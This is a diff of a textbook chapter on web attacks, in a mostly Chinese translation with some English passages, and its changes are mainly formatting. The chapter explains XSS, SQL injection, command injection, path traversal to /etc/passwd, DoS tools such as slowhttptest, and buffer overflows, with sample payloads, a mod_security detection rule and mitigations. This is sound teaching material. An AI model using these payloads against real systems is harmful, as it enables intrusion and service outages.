-A08:2021 软件和数据完整性失败—这可能更常被视为软件供应链失败，因为它包括代码验证失败以及与构建管道相关的问题，这些问题可能导致构建工具生成恶意输出。任何未能防范完整性失败的代码或基础设施都属于此类。
+`A08:2021 软件和数据完整性失败`—这可能更常被视为软件供应链失败，因为它包括代码验证失败以及与构建管道相关的问题，这些问题可能导致构建工具生成恶意输出。任何未能防范完整性失败的代码或基础设施都属于此类。
 
 # A09:2021 安全日志和监控失败
 
-A09:2021 安全日志和监控失败—在应用开发时，安全日志并不总是被考虑在内。更糟的是，运维团队可能根本没有监控任何日志。日志可以用于检测已识别的漏洞的利用。
+`A09:2021 安全日志和监控失败`—在应用开发时，安全日志并不总是被考虑在内。更糟的是，运维团队可能根本没有监控任何日志。日志可以用于检测已识别的漏洞的利用。
 
 # A10:2021 服务器端请求伪造
 
-A10:2021 服务器端请求伪造—此项是根据社区请求添加到列表中的，问题是当 Web 应用未验证用户提供的 URL 时会出现。这可能导致应用向意外目的地发送请求，从而让攻击者绕过其他防护（如防火墙或访问控制列表）。
+`A10:2021 服务器端请求伪造`—此项是根据社区请求添加到列表中的，问题是当 Web 应用未验证用户提供的 URL 时会出现。这可能导致应用向意外目的地发送请求，从而让攻击者绕过其他防护（如防火墙或访问控制列表）。
 
 虽然有很多 remediation（缓解措施）可以覆盖这些漏洞，合适的设计和输入验证是良好起点。下面是 OWASP 识别出的不同漏洞的一些示例。
 
@@ -10633,9 +11686,9 @@ XML 外部实体攻击现在归类为配置错误，虽然它以前是独立的�
 
 ## 跨站脚本 (XSS)
 
-跨站脚本 (XSS) 攻击是利用 Web 服务器攻击客户端的一种攻击。根据 OWASP Top 10，这是一种注入攻击，攻击者在输入字段中注入脚本代码片段，使其在访问该站点的用户浏览器中执行。XSS 有三种实现方式，它们都针对用户。区别在于脚本是否被存储。第一种，脚本存储在服务器上并对所有访问该页面的用户显示，称为 **持久型跨站脚本**。第二种是 **反射型跨站脚本**，脚本不存储，而是包含在发送给受害者的 URL 中。第三种利用文档对象模型 (DOM)。
+跨站脚本 (XSS) 攻击是利用 Web 服务器攻击客户端的一种攻击。根据 OWASP Top 10，这是一种注入攻击，攻击者在输入字段中注入脚本代码片段，使其在访问该站点的用户浏览器中执行。XSS 有三种实现方式，它们都针对用户。区别在于脚本是否被存储。第一种，脚本存储在服务器上并对所有访问该页面的用户显示，称为 `持久型跨站脚本`。第二种是 `反射型跨站脚本`，脚本不存储，而是包含在发送给受害者的 URL 中。第三种利用文档对象模型 (DOM)。
 
-所有三种类型都使用相同的脚本方式。攻击者会在 `<script></script>` 块中放置短脚本。例如，攻击者可能在输入字段中注入 `<script>alert('wubble');</script>`。在持久型跨站脚本中，这个值会被存储在服务器上，随后在用户访问页面时显示，脚本随之执行。典型例子是论坛：用户在填写姓名、邮箱和评论时，这些字段的值会被保存。当其他人返回论坛时，这些值会被渲染，脚本随之运行，弹出包含 *wubble* 的提示框。
+所有三种类型都使用相同的脚本方式。攻击者会在 `<script></script>` 块中放置短脚本。例如，攻击者可能在输入字段中注入 `<script>alert('wubble');</script>`。在持久型跨站脚本中，这个值会被存储在服务器上，随后在用户访问页面时显示，脚本随之执行。典型例子是论坛：用户在填写姓名、邮箱和评论时，这些字段的值会被保存。当其他人返回论坛时，这些值会被渲染，脚本随之运行，弹出包含 `wubble` 的提示框。
 
 在反射型攻击中，脚本不被存储，而是出现在 URL 参数中：
 
@@ -10649,30 +11702,29 @@ http://www.badsite.com/foo.php?param=<script>alert(5000);</script>
 <a href="http://www.badsite.com/foo.php?param=<script>alert(5000);</script"></a>
 ```
 
-
-
-
 The user, getting this email, would only see the clickable link. To see the URL the link goes to, they would have to hover their cursor over the link or perhaps look at the source code of the message. Even this assumes the user is capable of understanding HTML enough to know what is being done here. Obviously, a real script would do something more malicious, like stealing session information stored in cookies. Once the information was stolen, it could be transmitted to an attacker by making a request with the stolen information in it to a server managed by the attacker.
 
 The DOM is what enables the DOM‑based XSS attack. DOM is a way of referring to elements in the page as though they were objects. This means you can call methods on the objects—specifically, you can get and set parameters for those objects. The DOM‑based XSS would look just like the reflected XSS. The difference is that the variable referred to in the URL would be a portion of the page. Inside the page is a script that pulls that variable and does something based on what the value is. Sending a URL with a value of a script inside the variable will insert the script into the page, meaning the script will get executed.
 
 Since scripts can become complex and may use characters that are illegal in a URL, such as a space or other special characters, the characters need to be encoded. You encode these characters using something called URL encoding. To URL‑encode something, you convert the ASCII characters into a numeric value using the ASCII table. The numeric value is rendered in hexadecimal, and that value has a % in front of it to indicate that the following value is a hexadecimal representation of an ASCII character. Back to the space character, the decimal value of the space character in the ASCII character set is 32. In hexadecimal, that’s 20 (2 × 16). To render a space character into a URL, you would use %20. Anytime you see %20 in a URL, you know it’s replacing a space character, which wouldn’t be handled correctly by a server since white space is sometimes considered a delimiter, meaning the character before the space would be interpreted as the last character in the URL to the web server.
 
+
+
 Because encoding is often required in normal operations to pass information from the server to the client, this opens the door to encoding attacks. Attackers can similarly encode information, which makes it harder to detect encoded attacks. This is, in part, because of the number of types of encoding that can be used, which means defense has to be aware of the different types of encoding so decoding can be performed before looking for the attack. This is one reason why website attacks are so common—the defense against these attacks is difficult.
 
-#### SQL Injection
+## SQL Injection
 
 Of course, cross‑site scripting is not the only place where URL encoding is used. Anywhere you want to obscure text, you can URL‑encode it. It makes it harder for regular users to know what is being done because they can’t easily convert the hexadecimal values back to their ASCII equivalents. Many of the other attacks can be obscured or made successful through the use of URL encoding, and SQL injection is one of them. SQL is the Structured Query Language, used to make programmatic requests of a relational database server. The server manages the storage, which will vary from one server type to another, but to get to the storage, either by inserting data or retrieving it, you would use the SQL programming language.
 
 An SQL attack is an attack against the database server, ultimately, though it takes advantage of poor programming practices in the application code. As an injection attack, it happens when a malicious user sends in (injects) unexpected data through a web request. Sometimes, form data is passed directly into an SQL query from the application server to the database server to execute. If a fragment of legitimate SQL can be sent into a server where it is executed, the database could be altered or damaged. Also, data could be extracted or even have authentication bypassed.
 
-Applications you are trying to attack with SQL injection must already have SQL in place to run a query necessary for the application to succeed. For example, perhaps you are browsing an electronic storefront and you are trying to find all *Doctor Who* action figures because you really want one of Jodie Whittaker, since you have all the others. You issue a search on the site for *jodie whittaker doll* in order to get the right results back. Behind the scenes, the application may have an SQL statement that reads as follows:
+Applications you are trying to attack with SQL injection must already have SQL in place to run a query necessary for the application to succeed. For example, perhaps you are browsing an electronic storefront and you are trying to find all *Doctor Who* action figures because you really want one of Jodie Whittaker, since you have all the others. You issue a search on the site for `jodie whittaker doll` in order to get the right results back. Behind the scenes, the application may have an SQL statement that reads as follows:
 
 ```
 SELECT * FROM inventory_table WHERE description == '$searchstr';
 ```
 
-What you have submitted (*jodie whittaker doll*) goes into the variable `$searchstr`. This means it’s not as simple as just issuing your own query and expecting that to run. Instead, you need to find a way to get your query to work in the context of the existing one. Figure 12.2 shows the results from a successful SQL injection attack using one of the potential techniques.
+What you have submitted (`jodie whittaker doll`) goes into the variable `$searchstr`. This means it’s not as simple as just issuing your own query and expecting that to run. Instead, you need to find a way to get your query to work in the context of the existing one. Figure 12.2 shows the results from a successful SQL injection attack using one of the potential techniques.
 
 ![FIGURE 12.2 SQL injection attack outcome](img/c12f002.png)
 
@@ -10684,19 +11736,17 @@ This may not always work, depending on the SQL query in place in the application
 
 Since SQL doesn’t always work the same from one server type to another, the question becomes how you can determine what the underlying database server is. You may be able to know based on the reconnaissance you did earlier. For example, a poorly configured Apache server may tell you what modules are loaded. You may be able to tell based on the results of an application version scan that there is a MySQL server. If you are testing against a Microsoft IIS installation, you could guess it may be Microsoft SQL Server. A more definitive way would be to introduce invalid SQL into the application. If the application is well programmed, you shouldn’t get anything back, but often you will get an error from the database server. Either you will get an error message that includes what the database server is or you will get an error message that allows you to determine the server type because of the wording of the error.
 
-
-
 -   在图 12.2 的情形下，我们从查询中获取了输出。并非所有查询都会产生输出。这意味着你在飞盲，因为看不到查询的结果。在这种情况下，你正在发出盲目 SQL 注入攻击。由于可能在飞盲，你需要改变思路。你需要结构化查询，使得成功或失败是可见的，因为应用程序的工作方式如此。盲注入的目的在于观察页面是否根据提供的输入而表现不同。这可能让你在花费大量时间尝试运行这些攻击之前，就判断页面是否容易受到 SQL 注入攻击。
 
-假设你有一个搜索框，如前所述。与其输入完整的 *jodie whittaker doll* 搜索字符串，你可以只输入 *jodie*。与此同时，你会尝试通过追加 *and 1 = 2* 来得到一个假的结果，因为 1 永远不等于 2，整个搜索应该返回假。一旦你查看该页面的结果，你可以再运行一个查询，该查询应该返回真。除了 1 = 2，你可以使用 1 = 1\. 如果你得到的查询 1 = 1 的结果与 1 = 2 不同，则页面可能容易受到 SQL 注入攻击。你可以作出这一假设，因为当提交不同的 SQL 时，应用程序的响应会有所不同。
+假设你有一个搜索框，如前所述。与其输入完整的 `jodie whittaker doll` 搜索字符串，你可以只输入 `jodie`。与此同时，你会尝试通过追加 `and 1 = 2` 来得到一个假的结果，因为 1 永远不等于 2，整个搜索应该返回假。一旦你查看该页面的结果，你可以再运行一个查询，该查询应该返回真。除了 `1 = 2`，你可以使用 `1 = 1`。如果你得到的查询 `1 = 1` 的结果与 `1 = 2` 不同，则页面可能容易受到 SQL 注入攻击。你可以作出这一假设，因为当提交不同的 SQL 时，应用程序的响应会有所不同。
 
 缓解这些攻击的方法有几种。第一种是对用户输入进行过滤，就像你对其他攻击所做的那样。你可以查找特殊字符并将其去除。你可以查找看起来像 SQL 语句的内容并移除这些部分。这可能包括使用类似白名单的特性，即只允许列表中的文本。
 
 另一种方法是使用参数化查询或存储过程。这些方法的效果相似，因为你无法在程序中操纵字符串。用户侧发送的值会作为参数传递给查询。因此，注释字符无法消除其余的查询字符串。此外，任何试图通过操纵引号插入 SQL 语句的行为都不会成功，因为作为参数的行为与直接将文本插入字符串值的行为不同。
 
-#### 命令注入
+## 命令注入
 
-命令注入攻击的结果可能与 XML 外部实体注入攻击相似。这是另一种注入攻击，根据 OWASP Top 10。此类攻击的目标是操作系统。应用程序从用户那里获取一个值并将其传递给系统函数或评估函数。这些函数将参数传递给操作系统进行处理。这意味着，如果没有输入验证，你可以在输入字段中注入操作系统命令，而该命令将被操作系统执行。你可以在 图 12.3 中看到命令注入攻击可能的结果示例。输入框期望一个 IP 地址或主机名。应用程序会将该 IP 地址作为参数运行 `ping` 命令。此演示使用 Damn Vulnerable Web Application (DVWA) 作为目标平台。
+命令注入攻击的结果可能与 XML 外部实体注入攻击相似。这是另一种注入攻击，根据 OWASP Top 10。此类攻击的目标是操作系统。应用程序从用户那里获取一个值并将其传递给系统函数或评估函数。这些函数将参数传递给操作系统进行处理。这意味着，如果没有输入验证，你可以在输入字段中注入操作系统命令，而该命令将被操作系统执行。你可以在图 12.3 中看到命令注入攻击可能的结果示例。输入框期望一个 IP 地址或主机名。应用程序会将该 IP 地址作为参数运行 `ping` 命令。此演示使用 Damn Vulnerable Web Application (DVWA) 作为目标平台。
 
 ![FIGURE 12.3 Command‑line injection attack output](img/c12f003.png)
 
@@ -10708,13 +11758,15 @@ Since SQL doesn’t always work the same from one server type to another, the qu
 
 与其他 Web 应用攻击一样，缓解措施也有几种。正如以往一样，输入验证是正确答案。了解输入应该是什么样子。如果不符合预期，则拒绝输入并要求用户提供更干净的内容。在图 12.3 的情形中，IP 地址具有明确的结构。你可以将输入与该结构进行比对。如果输入不像 IP 地址，则拒绝所有输入。你也可以构建应用，使得用户输入永不直接传递给系统，哪怕是作为命令的一部分。
 
-#### 目录或文件遍历
+## 目录或文件遍历
 
 目录或文件遍历是一种常见的攻击，正如 EC‑Council 之前指出的那样。这是一种试图突破 Web 服务器构建的“监狱”以访问文件系统的攻击。Web 服务器使用文件系统的一部分来提供文件。例如，请求 `www.webserver.com` 会被映射到 Web 服务器认为的根目录的某个子目录，如 Linux 系统中的 `/var/www/html`。该 URL 的请求会返回 `index.html` 的内容，假设该页面是根据 Web 服务器的配置设为默认首页。
 
 这种配置意味着你无法直接请求 `http://www.webserver.com/etc/passwd` 并获取 `/etc` 目录下的 `passwd` 文件。对 Web 服务器而言，`/etc` 目录不存在，因为它的根目录是 `/var/www/html`。所有请求都相对于该顶级目录。不过，正如你可能已经知道的，命令行工具可以使用相对路径向上或向下 traversal。
 
-假设你在命令行界面（即 *shell*）中工作，并且当前目录是 `/var/www/html`。你仍然可以通过引用父目录来到达文件系统的根目录。在 `/var/www/html` 中，我们可以使用 `../../../etc` 来到达 `/etc` 目录，因为 `../` 会将我们提升一个层级。下面的示例展示了利用此技巧访问 `/etc/passwd` 文件：
+
+
+假设你在命令行界面（即 `shell`）中工作，并且当前目录是 `/var/www/html`。你仍然可以通过引用父目录来到达文件系统的根目录。在 `/var/www/html` 中，我们可以使用 `../../../etc` 来到达 `/etc` 目录，因为 `../` 会将我们提升一个层级。下面的示例展示了利用此技巧访问 `/etc/passwd` 文件：
 
 ```
 kilroy@yaz:/usr/share/modsecurity-crs/rules$ cd /var/www/html
@@ -10727,8 +11779,7 @@ bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
 sync:x:4:65534:sync:/bin:/bin/sync
 games:x:5:60:games:/usr/games:/usr/sbin/nologin
-
-
+```
 
 你可以在某些 Web 服务器上使用相同的技术，如果它们容易受到这种方法的影响。当然，这已经是一种多年的技术，所以大多数 Web 服务器都已经知道并不允许它。然而，Web 应用程序可以利用这一点在 Web 服务器防护之外进行攻击。如果一个 Web 应用包含读取磁盘文件的代码，尤其是如果这些文件随后通过浏览器界面呈现给用户，你就可以使用文件遍历攻击。针对这种攻击的常见做法是堆叠大量的 `../../` 组合。如果你提供不够多，你就达不到文件系统的顶层。如果你提供太多，它们会在某个时刻被忽略，因为你已经到达了树的顶端，根本无法再向上移动。
 
@@ -10746,17 +11797,16 @@ URL 操作也可用于强制浏览。强制浏览是使用字典中的页面或�
 
 在保护 Web 应用时，有几种常见的做法。最简便的是进行基本的输入验证。这意味着在应用程序要求时预先指定输入应该是什么样子。除非你知道输入应该是什么样子，否则几乎不可能知道它不应该是什么样子，从而排除所有看起来像那样的内容。单纯剥除或阻止特殊字符并不总是容易。一旦开始剥除特殊字符，就会出现许多无法正确渲染的名称，例如。还有其他限制，比如密码不能使用更广泛的符号集，导致字符集变小，使得密码更易于暴力破解。
 
-即使你知道要查找的恶意模式，仍可能因误操作而“自砍脚”。常见的做法是使用正则表达式来识别恶意模式。正则表达式是一种模式匹配语言，最初用于 Unix shell 脚本，后来被移植到多种其他用途。编程语言也广泛使用正则表达式。事实上，一种变体叫作 *Perl‑compatible regular expressions*（PCRE），起源于 Perl 语言，但已在其他环境中实现。
+即使你知道要查找的恶意模式，仍可能因误操作而“自砍脚”。常见的做法是使用正则表达式来识别恶意模式。正则表达式是一种模式匹配语言，最初用于 Unix shell 脚本，后来被移植到多种其他用途。编程语言也广泛使用正则表达式。事实上，一种变体叫作 `Perl-compatible regular expressions`（PCRE），起源于 Perl 语言，但已在其他环境中实现。
 
-这里不是教正则表达式的最佳场所，因为它既复杂又紧凑。为了演示其复杂性，可以考虑类似 `^[0 ‑ 9a ‑ fA ‑ f]+$` 的表达式。该表达式表示从行首（^）开始，匹配任意数量的数字或字母 a‑f（大小写均可），并在行尾（$）结束。简言之，它用于匹配单独位于行上的十六进制值。该正则表达式只会在行上单独的十六进制字符串时匹配，其他情况均不匹配。
+这里不是教正则表达式的最佳场所，因为它既复杂又紧凑。为了演示其复杂性，可以考虑类似 `^[0‑9a‑fA‑f]+$` 的表达式。该表达式表示从行首（`^`）开始，匹配任意数量的数字或字母 a‑f（大小写均可），并在行尾（`$`）结束。简言之，它用于匹配单独位于行上的十六进制值。该正则表达式只会在行上单独的十六进制字符串时匹配，其他情况均不匹配。
 
-在如此复杂的语言中，出错或生成比必要更复杂的表达式并不罕见。当正则表达式用于保护 Web 应用代码时，可能会导致程序无限循环尝试解析给定的输入，这称为 *regex denial of service*（ReDoS）。如果编程不够好，Web 应用本身会成为问题。一种应对办法是使用已经经过充分测试的输入验证库。
+在如此复杂的语言中，出错或生成比必要更复杂的表达式并不罕见。当正则表达式用于保护 Web 应用代码时，可能会导致程序无限循环尝试解析给定的输入，这称为 `regex denial of service`（ReDoS）。如果编程不够好，Web 应用本身会成为问题。一种应对办法是使用已经经过充分测试的输入验证库。
 
 即使采用良好的编程实践，仍有可能在某个时点发现其中的漏洞。这时，拥有防护措施或侦测能力就显得尤为重要。Web 应用防火墙（WAF）是一种工作在应用层的防火墙，它读取 HTTP 请求并将其与攻击模式进行匹配。与其他防火墙类似，你可以编写规则来记录流量或阻止请求。虽然有很多商业 WAF 可供选择，你也可以使用 `mod_security`，它是一种可加载到 Apache Web 服务器中的模块。许多 WAF 位于 Web 服务器前面，作为独立应用或设备，但 `mod_security` 本身即嵌入在 Web 服务器内部。下面是一个 `mod_security` 规则示例：
 
 ```
-SecRule ARGS_NAMES|ARGS|XML:/* "@rx ((?:[~!@#\$%\^&\*\(\)\-
-\+=\{\}\[\]\|:;\"'\^'\`<>][^~!@#\$%\^&\*\(\)\-\+=\{\}\[\]\|:;\"'\^'\`<>]*?){2})" \
+SecRule ARGS_NAMES|ARGS|XML:/* "@rx ((?:[~!@#\$%\^&\*\(\)\-\+=\{\}\[\]\|:;\"'\^'\`<>][^~!@#\$%\^&\*\(\)\-\+=\{\}\[\]\|:;\"'\^'\`<>]*?){2})" \
     "id:942432,\
     phase:2,\
     block,\
@@ -10781,9 +11831,6 @@ SecRule ARGS_NAMES|ARGS|XML:/* "@rx ((?:[~!@#\$%\^&\*\(\)\-
     setvar:'tx.sql_injection_score=+%{tx.warning_anomaly_score}'"
 ```
 
-
-
-
 大部分规则是关于提供可以在警报中提供的元数据。例如，此漏洞是 OWASP 顶级漏洞列表中的一项。你会在规则的标签之一中发现这一事实。规则的重要部分是第一行，指示要匹配的模式。这是一个正则表达式，指示 SQL 注入攻击可能的样子。`mod_security` 采用分阶段方式评估规则。第一阶段检查请求头。第二阶段，根据第三行，该规则属于此阶段，检查请求体。其他阶段检查响应头、响应体和日志。
 
 与任何基于规则的安全技术一样，该技术提供的保护完全依赖于规则。如果规则编写不当，或针对特定攻击没有规则，那么攻击可以通过 WAF 进行。这并不意味着 WAF 是个坏主意。它的意思是需要已验证的规则，并且要关注现代攻击以引入新规则。此外，它也意味着应用程序需要以防御性方式编写，因为前面的技术可能不足以阻止攻击进入应用。
@@ -10798,13 +11845,13 @@ SecRule ARGS_NAMES|ARGS|XML:/* "@rx ((?:[~!@#\$%\^&\*\(\)\-
 
 另一种更实际的方法，尤其是当你没有很多朋友时，是利用大量被 compromised 的系统。这可以通过使用能够向目标发送请求的僵尸网络（botnet）来实现。僵尸网络越大，你能生成的流量就越多。这假设你要么拥有僵尸网络，要么知道在哪里租用一个。并不是所有人都花时间去获取僵尸网络客户端，因此你需要采取另一种方法。
 
-好在，还有一种方法可以用很少的投入换取很大的回报。放大攻击（Amplification attacks）长期以来都是可能的。最早用于放大攻击的协议是 ICMP。Smurf 攻击使用 ICMP echo request 发送到广播地址。如果你选择足够大的网络并发送足够大的请求，就可以得到巨大的大量响应。由于请求使用了伪造的源地址，响应全部会发送到目标。该攻击在 90 年代末至 2000 年代初达到高峰，当时向广播地址发送 ping 包可能会得到数万的响应，这些响应被称为 *duplicates*，因为在第一个响应后，每一次后续响应都被视为重复。如今这种攻击的影响不如从前大。Figure 12.4 展示了 2017 年之前仍然存在的最大的 Smurf 放大器，之后的 Smurf 放大器注册表停止检查。该页面除存档外已不存在。
+好在，还有一种方法可以用很少的投入换取很大的回报。放大攻击（Amplification attacks）长期以来都是可能的。最早用于放大攻击的协议是 ICMP。Smurf 攻击使用 ICMP echo request 发送到广播地址。如果你选择足够大的网络并发送足够大的请求，就可以得到巨大的大量响应。由于请求使用了伪造的源地址，响应全部会发送到目标。该攻击在 90 年代末至 2000 年代初达到高峰，当时向广播地址发送 ping 包可能会得到数万的响应，这些响应被称为 `duplicates`，因为在第一个响应后，每一次后续响应都被视为重复。如今这种攻击的影响不如从前大。Figure 12.4 展示了 2017 年之前仍然存在的最大的 Smurf 放大器，之后的 Smurf 放大器注册表停止检查。该页面除存档外已不存在。
 
 ```
 ![FIGURE 12.4 Smurf amplifier registry](img/c12f004.png)
 ```
 
-**FIGURE 12.4** Smurf amplifier registry
+FIGURE 12.4 Smurf amplifier registry
 
 现在我们不再需要依赖 Smurf 攻击来进行放大攻击。另一个可以使用的协议是 DNS。这些攻击在近年来获得了一定的知名度。最著名的一次攻击是针对 Brian Krebs 的网站 Krebs on Security，该站点由调查记者 Krebs 运营，提供信息安全故事。流量峰值达到了 620 Gbps。
 
@@ -10816,9 +11863,9 @@ DNS 请求使用 UDP 作为传输协议，和 ICMP 一样，不验证源地址�
 ![FIGURE 12.5 Low Orbit Ion Cannon](img/c12f005.png)
 ```
 
-**FIGURE 12.5** Low Orbit Ion Cannon
+FIGURE 12.5 Low Orbit Ion Cannon
 
-如果有大量用户参与，这类攻击通常称为 *distributed denial of service*，因为涉及的系统通常分布在 Internet 各地。正是这种分散性使其成为分布式攻击。正如前面所指出的，随着企业带宽的增加，单一系统或站点很难生成足够的流量将站点 offline。因此，几乎所有带宽导向的现代拒绝服务攻击都是分布式拒绝服务攻击。这并不意味着所有拒绝服务攻击都是分布式的或带宽导向的。
+如果有大量用户参与，这类攻击通常称为 `distributed denial of service`，因为涉及的系统通常分布在 Internet 各地。正是这种分散性使其成为分布式攻击。正如前面所指出的，随着企业带宽的增加，单一系统或站点很难生成足够的流量将站点 offline。因此，几乎所有带宽导向的现代拒绝服务攻击都是分布式拒绝服务攻击。这并不意味着所有拒绝服务攻击都是分布式的或带宽导向的。
 
 在对这种攻击进行缓解时，选项并不多。如果你在自己的网络上托管自己的服务且成为拒绝服务攻击的目标，在被攻击时你能做的最好是联系你的互联网服务提供商（ISP）并希望他们在攻击到达你之前进行分流。到达你网络连接时已经太迟了；你的连接已被洪水淹没，这正是导致服务不可用的原因。你的防火墙或其他位于 premises 的设备对此无能为力。
 
@@ -10826,45 +11873,63 @@ DNS 请求使用 UDP 作为传输协议，和 ICMP 一样，不验证源地址�
 
 ### 慢攻击
 
-
-
-
 Volume attacks 不是唯一创建服务拒绝的方式。你不需要消耗带宽，甚至不必快速发送大量请求。还有一些本质上看起来正常的、本质上是慢速的攻击。这些慢速的 HTTP 攻击通常非常有效，而不需要投入很多努力。早期的拒绝服务攻击是 SYN flood，它会填满 web 服务器的连接缓冲区。该攻击不需要大量请求，且所需带宽很少。按照常规，这种攻击已经不再有效，但其概念仍然可行。使用 slowloris 攻击（取名自东南亚东南亚的慢 loris 灵长类动物），其目标是向 web 服务器发送不完整的请求。当请求被发送时，三次握手已完成，因此 SYN 缓冲区不参与。相反，web 服务器能够同时处理的请求数量是决定性因素。
 
 Web 服务器可能会配置可以并发运行的线程数量。这可以防止 web 服务器消耗系统过多的资源。然而，一旦所有线程都已被使用完毕，系统将无法再接受新的连接。slowloris 攻击可针对 web 服务器，事实上在下面的代码片段中，你可以看到 `slowhttptest` 程序的运行，该程序可用于执行 slowloris 攻击。仅用 26 秒，该程序就导致默认 Apache 安装停止响应请求。这并不算什么惊人，因为默认的 Apache 安装在单台服务器上并未配置为能够接受大量请求。
 
-**`slowhttptest` 对 Apache 服务器的运行**
+`slowhttptest` 对 Apache 服务器的运行
 
 ```
  slowhttptest version 1.8.2
+
   - https://code.google.com/p/slowhttptest/ -
+
  test type:                        SLOW HEADERS
+
  number of connections:            50
+
  URL:                              http://192.168.86.44/
+
  verb:                             GET
+
  Content-Length header value:      4096
+
  follow up data max size:          68
+
  interval between follow up data:  10 seconds
+
  connections per seconds:          50
+
  probe connection timeout:         5 seconds
+
  test duration:                    240 seconds
+
  using proxy:                      no proxy
- 
+
  Sat Jan  5 21:28:31 2019:
+
  slow HTTP test status on 25th second:
- 
+
  initializing:        0
+
  pending:             0
+
  connected:           15
+
  error:               0
+
  closed:              35
+
  service available:   YES
+
  Sat Jan  5 21:28:32 2019:
+
  Test ended on 26th second
+
  Exit status: No open connections left
-          
- 
 ```
+
+
 
 程序 `slowhttptest` 也可用于执行其他 HTTP 攻击，包括 R‑U‑Dead‑Yet，这是一种另一种慢请求攻击，它使用 HTTP 体而不是 HTTP 头部（与 slowloris 类似）。可以通过 `slowhttptest` 运行 Apache Killer 攻击。该程序会发送请求，请求重叠的字节范围。这会导致服务器因 Apache 程序中的 bug 而消耗内存。这是一种针对特定 Apache 版本的攻击，而其他攻击则与服务器配置有关，而非软件本身的 bug。最后，`slowhttptest` 支持慢读攻击。在慢读攻击中，程序向服务器请求一个大文件，然后以小段方式逐步读取该文件。攻击程序可以在读取之间等待很长时间，从而长时间保持连接打开，阻塞本可以被合法用户使用的连接。
 
@@ -10892,9 +11957,7 @@ teardrop 攻击是指攻击者向目标发送碎片化的 IP 包，并使碎片�
 
 **FIGURE 12.6** Stack frame
 
-
-
-缓冲区溢出之所以发生是因为局部变量。每个变量都在堆栈上分配空间。在某些情况下，数据会被复制到已分配的空间中，但如果被复制的数据（称为`buffer`）大于该缓冲区，则被复制的数据会覆盖堆栈中的其他内容，包括返回地址。图 12.7（`Figure 12.7`）展示了当向缓冲区传入过多数据时会发生什么情况。假设有一个名为`strName`的缓冲区，已分配 10 字节（字符），但函数正在复制 16 字节（字符）到该变量。10 字节（这里是 10 个`A`）填满了为该变量分配的 10 字节。剩余的 6 字节写入内存中的下一个地址空间。在这种情况下，下一个内存地址空间是返回地址。返回地址在函数调用时被填充，在函数完成时被检索。
+缓冲区溢出之所以发生是因为局部变量。每个变量都在堆栈上分配空间。在某些情况下，数据会被复制到已分配的空间中，但如果被复制的数据（称为`buffer`）大于该缓冲区，则被复制的数据会覆盖堆栈中的其他内容，包括返回地址。图 12.7（Figure 12.7）展示了当向缓冲区传入过多数据时会发生什么情况。假设有一个名为`strName`的缓冲区，已分配 10 字节（字符），但函数正在复制 16 字节（字符）到该变量。10 字节（这里是 10 个`A`）填满了为该变量分配的 10 字节。剩余的 6 字节写入内存中的下一个地址空间。在这种情况下，下一个内存地址空间是返回地址。返回地址在函数调用时被填充，在函数完成时被检索。
 
 ![FIGURE 12.7 Buffer overflow](img/c12f007.png)
 
@@ -10902,7 +11965,7 @@ teardrop 攻击是指攻击者向目标发送碎片化的 IP 包，并使碎片�
 
 在此情况下，返回地址被`A`填充。实际上，字节为`0x41`，这是`A`的 ASCII 值的十六进制表示。程序将尝试跳转到的地址包含`0x414141414141`。这样的地址很可能超出程序执行的地址空间，这意味着程序会因**segmentation fault**（段错误）而失败。段错误发生在程序尝试跳转到其内存段之外的地址时。
 
-缓冲区溢出的目的是注入一段代码（称为`shellcode`），攻击者希望该代码被执行。返回地址保存的位置需要指向 shellcode 所在的内存空间。这意味着该位置的代码（汇编语言，因为这是处理器理解的语言）将被执行。攻击者可能会创建一个系统 shell 的调用，以便返回给他们。
+缓冲区溢出的目的是注入一段代码（称为`shellcode`），攻击者希望该代码被执行。返回地址保存的位置需要指向`shellcode`所在的内存空间。这意味着该位置的代码（汇编语言，因为这是处理器理解的语言）将被执行。攻击者可能会创建一个系统 shell 的调用，以便返回给他们。
 
 保护此类攻击的一种方法是防止栈上的内容被执行。由于程序的代码位于不同的内存段中，栈不应包含可执行的代码。虽然存在这种限制，但也有规避方法。其中一种称为**return to libc**。标准 C 库包含 C 语言中所有标准函数，通常以共享库形式存储，供所有使用 C 语言并编译为共享库的程序使用。该库可能存储在已知的内存位置，因此攻击者可以将返回地址覆盖为标准 C 库中的函数地址，这些函数可以被攻击者利用。即使库的位置未知，也可以通过探测确定它，因为可以让 C 函数输出内存位置。
 
@@ -10918,15 +11981,13 @@ teardrop 攻击是指攻击者向目标发送碎片化的 IP 包，并使碎片�
 
 由于内存在运行时分配，因此没有保证会在什么时间分配什么内存，因为程序的运行需求会因程序行为而变化。此外，堆中不存储返回地址，因此无法通过堆来操控返回地址。这并不意味着在堆中无法进行利用。堆喷洒（heap spraying）是一种技术，但不能单独使用。
 
-缓冲区溢出的一个问题是如何可靠地将 shellcode 注入内存并使返回地址可靠地指向它。栈空间可能有限，限制了 shellcode 的大小。堆可以在这方面提供帮助。堆喷洒技术利用堆来存储 shellcode。堆通常位于已知的内存位置，且如果 shellcode 被分配在堆上，其位置可能可预测。
+缓冲区溢出的一个问题是如何可靠地将`shellcode`注入内存并使返回地址可靠地指向它。栈空间可能有限，限制了`shellcode`的大小。堆可以在这方面提供帮助。堆喷洒技术利用堆来存储`shellcode`。堆通常位于已知的内存位置，且如果`shellcode`被分配在堆上，其位置可能可预测。
 
-攻击者会在堆中尽可能多地存储 shellcode，然后利用缓冲区溢出将 shellcode 的地址写入返回地址中。程序随后会跳转到堆并执行存储在那里的 shellcode。浏览器是这类攻击的常见目标，因为浏览器需要动态分配内存，具体取决于请求的页面和页面内容，从而提供了大量可用的堆空间来存储 shellcode。
+攻击者会在堆中尽可能多地存储`shellcode`，然后利用缓冲区溢出将`shellcode`的地址写入返回地址中。程序随后会跳转到堆并执行存储在那里的`shellcode`。浏览器是这类攻击的常见目标，因为浏览器需要动态分配内存，具体取决于请求的页面和页面内容，从而提供了大量可用的堆空间来存储`shellcode`。
 
 ### 应用保护与规避
 
 如前所述，操作系统通过使用地址空间布局随机化（ASLR）来保护自身和运行的应用程序。ASLR 是一种技术，使得攻击者使用缓冲区溢出攻击变得困难。缓冲区溢出攻击成功的前提是攻击者能够控制指针，使操作系统执行攻击者提供的代码。这意味着攻击者需要知道其提供的代码在内存中的位置。如果地址每次运行都不同，则不可预测。一次程序运行可能得到一个地址，而后续运行会得到完全不同的地址。
-
-
 
